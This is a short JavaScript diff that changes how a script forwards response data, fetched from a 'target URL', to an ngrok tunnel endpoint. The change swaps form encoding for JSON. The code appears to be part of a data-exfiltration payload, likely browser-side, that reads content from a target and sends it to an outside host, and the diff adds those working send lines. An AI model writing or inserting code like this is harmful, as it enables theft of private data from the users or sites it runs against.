@@ -17,11 +17,14 @@
             responseData = responseData.slice(0, maxSize); // Trim to max size
         }
 
-        // Send the actual response data to your logging endpoint
+        // Send the actual response data to your logging endpoint as JSON
         var logReq = new XMLHttpRequest();
         logReq.open('POST', 'https://86d9-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app/log', true);
-        logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        logReq.send('key=' + encodeURIComponent(responseData)); // Send the trimmed/encoded response
+        logReq.setRequestHeader('Content-Type', 'application/json');
+
+        // Send the data as JSON
+        var payload = JSON.stringify({ key: responseData });
+        logReq.send(payload);
     };
 
     // Configure the request to the target URL
